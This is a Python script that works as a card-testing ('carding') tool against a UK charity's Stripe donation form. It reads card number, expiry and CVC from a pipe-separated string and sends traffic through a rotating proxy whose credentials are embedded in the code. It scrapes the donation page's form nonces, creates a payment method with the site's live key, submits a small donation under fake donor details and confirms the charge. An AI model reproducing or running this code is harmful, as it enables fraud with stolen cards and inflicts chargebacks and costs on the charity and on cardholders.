import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "p.webshare.io:80:rotate-zlanvdvs:7zzew86qyip3"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(2, 9)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'authority': 'racingwelfare.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'referer': 'https://www.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = requests.get('https://racingwelfare.co.uk/campaigns/donate-to-racing-welfare/', headers=headers)
	
	form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
	donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
	
	import requests
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4e21d61aa2%3B+stripe-js-v3%2F4e21d61aa2%3B+card-element&key=pk_live_qAsilTNmWb2Py0BubDmQYKTN'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'racingwelfare.co.uk',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://racingwelfare.co.uk',
	    'referer': 'https://racingwelfare.co.uk/campaigns/donate-to-racing-welfare/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'charitable_form_id': f'{form_id}',
	    f'{form_id}': '',
	    '_charitable_donation_nonce': f'{donation_nonce}',
	    '_wp_http_referer': '/campaigns/donate-to-racing-welfare/',
	    'campaign_id': '292',
	    'description': 'Donate to Racing Welfare',
	    'ID': '0',
	    'gateway': 'stripe',
	    'donation_amount': 'custom',
	    'custom_donation_amount': '1.00',
	    'title': 'Mr',
	    'first_name': 'Gen',
	    'last_name': 'Paypal',
	    'email': 'genpaypal02@gmail.com',
	    'address': 'Street 27',
	    'address_2': '',
	    'address_3': '',
	    'city': 'New York',
	    'state': 'New York',
	    'postcode': '10080',
	    'country': 'US',
	    'phone': '',
	    'reason_doanting': 'Gen Paypal',
	    'stripe_payment_method': f'{pm}',
	    'action': 'make_donation',
	    'form_action': 'make_donation',
	}
	
	response = requests.post('https://racingwelfare.co.uk/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	try:
		scrt = response.json().get('secret')
		if not scrt:
			return response.text
		pi = re.search(r"(pi_[^_]+)", scrt)
		pi = pi.group(1)
	except Exception:
		return response.text	
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'expected_payment_method_type': 'card',
	    'use_stripe_sdk': 'true',
	    'key': 'pk_live_qAsilTNmWb2Py0BubDmQYKTN',
	    'client_secret': f'{scrt}',
	}
	
	response = requests.post(
	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
	    headers=headers,
	    data=data,
	)
	
	return response.text
